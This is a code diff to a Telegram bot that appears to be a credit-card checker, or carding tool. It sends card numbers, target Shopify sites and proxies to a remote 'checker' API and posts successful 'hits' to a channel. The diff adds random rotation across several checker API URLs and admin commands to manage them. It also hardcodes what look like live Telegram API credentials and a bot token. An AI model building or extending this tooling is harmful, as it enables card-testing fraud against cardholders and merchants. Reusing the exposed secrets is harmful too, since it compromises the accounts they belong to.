@@ -13,7 +13,7 @@ API_ID = 39194184
 API_HASH = '1ebb44855df1c3ef005b72904d122fd3'
 BOT_TOKEN = '8912938539:AAFsQCkxKod6lVBUpX8yuwLozmyb_PiNDcw'
 ADMIN_ID = [6505395037,8674966655]
-CHECKER_API_URL = 'https://chirag-x-shopify-production.up.railway.app/shopify'
+CHECKER_API_URLS_FILE = "api_urls.json"
 SESSION_STRING = ""
 
 
@@ -262,6 +262,31 @@ async def save_sites_with_price(data):
     with open(SITES_WITH_PRICE_FILE, 'w') as f:
         json.dump(data, f, indent=4)
 
+def load_api_urls():
+    if not os.path.exists(CHECKER_API_URLS_FILE):
+        default = ['https://chirag-x-shopify-production.up.railway.app/shopify']
+        with open(CHECKER_API_URLS_FILE, 'w') as f:
+            json.dump(default, f)
+        return default
+    try:
+        with open(CHECKER_API_URLS_FILE, 'r') as f:
+            urls = json.load(f)
+        if not urls:
+            default = ['https://chirag-x-shopify-production.up.railway.app/shopify']
+            with open(CHECKER_API_URLS_FILE, 'w') as f:
+                json.dump(default, f)
+            return default
+        return urls
+    except:
+        default = ['https://chirag-x-shopify-production.up.railway.app/shopify']
+        with open(CHECKER_API_URLS_FILE, 'w') as f:
+            json.dump(default, f)
+        return default
+
+def save_api_urls(urls):
+    with open(CHECKER_API_URLS_FILE, 'w') as f:
+        json.dump(urls, f, indent=4)
+
 def get_price_from_response(raw_response):
     try:
         price = raw_response.get('Price', '-')
@@ -397,7 +422,7 @@ async def check_card(card, site, proxy):
                 proxy_str = f"{ip}:{port}"
             else:
                 proxy_str = proxy
-        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
+        url = f'{random.choice(load_api_urls())}?site={site}&cc={card}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         timeout = aiohttp.ClientTimeout(total=100)
@@ -464,7 +489,7 @@ async def test_site_with_price(site, proxy):
             elif len(proxy_parts) == 2:
                 ip, port = proxy_parts
                 proxy_str = f"{ip}:{port}"
-        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
+        url = f'{random.choice(load_api_urls())}?site={site}&cc={test_card}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         timeout = aiohttp.ClientTimeout(total=60)
@@ -1970,6 +1995,62 @@ async def toggle_hits(event):
     else:
         HITS_CHANNEL_ID = -abs(HITS_CHANNEL_ID)
         await event.reply(premium_emoji("✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oɴ"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'/addapi\s+'))
+async def add_api_command(event):
+    if event.sender_id not in ADMIN_ID:
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
+        return
+    parts = event.raw_text.split()
+    if len(parts) < 2:
+        await event.reply(premium_emoji("❌ Usᴀɢᴇ: /ᴀᴅᴅᴀᴘɪ <ᴜʀʟ>"), parse_mode='html')
+        return
+    new_url = parts[1]
+    urls = load_api_urls()
+    if new_url in urls:
+        await event.reply(premium_emoji(f"⚠️ Yᴇ ᴀᴘɪ ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ hai!"), parse_mode='html')
+        return
+    urls.append(new_url)
+    save_api_urls(urls)
+    await event.reply(premium_emoji(f"✅ Aᴘɪ ᴀᴅᴅᴇᴅ: <code>{new_url}</code>\n\n📊 Tᴏᴛᴀʟ Aᴘɪs: {len(urls)}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'/removeapi\s+'))
+async def remove_api_command(event):
+    if event.sender_id not in ADMIN_ID:
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
+        return
+    parts = event.raw_text.split()
+    if len(parts) < 2:
+        await event.reply(premium_emoji("❌ Usᴀɢᴇ: /ʀᴇᴍᴏᴠᴇᴀᴘɪ <ᴜʀʟ>"), parse_mode='html')
+        return
+    remove_url = parts[1]
+    urls = load_api_urls()
+    if remove_url not in urls:
+        await event.reply(premium_emoji(f"❌ Yᴇ ᴀᴘɪ ɴʜɪ ᴍɪʟɪ!"), parse_mode='html')
+        return
+    urls.remove(remove_url)
+    if not urls:
+        urls.append('https://chirag-x-shopify-production.up.railway.app/shopify')
+        save_api_urls(urls)
+        await event.reply(premium_emoji(f"✅ Aᴘɪ ʀᴇᴍᴏᴠᴇᴅ!\n⚠️ Dᴇғᴀᴜʟᴛ Aᴘɪ ʀᴇsᴛᴏʀᴇᴅ."), parse_mode='html')
+        return
+    save_api_urls(urls)
+    await event.reply(premium_emoji(f"✅ Aᴘɪ ʀᴇᴍᴏᴠᴇᴅ: <code>{remove_url}</code>\n\n📊 Tᴏᴛᴀʟ Aᴘɪs: {len(urls)}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern='/listapi'))
+async def list_api_command(event):
+    if event.sender_id not in ADMIN_ID:
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
+        return
+    urls = load_api_urls()
+    if not urls:
+        await event.reply(premium_emoji("❌ Kᴏɪ Aᴘɪ sᴇᴛ ɴʜɪ ʜᴀɪ!"), parse_mode='html')
+        return
+    api_text = "🌐 <b>Aᴄᴛɪᴠᴇ Aᴘɪs:</b>\n\n"
+    for i, url in enumerate(urls, 1):
+        api_text += f"  {i}. <code>{url}</code>\n"
+    api_text += f"\n📊 Tᴏᴛᴀʟ: {len(urls)}"
+    await event.reply(premium_emoji(api_text), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/setfilter'))
 async def set_filter_command(event):
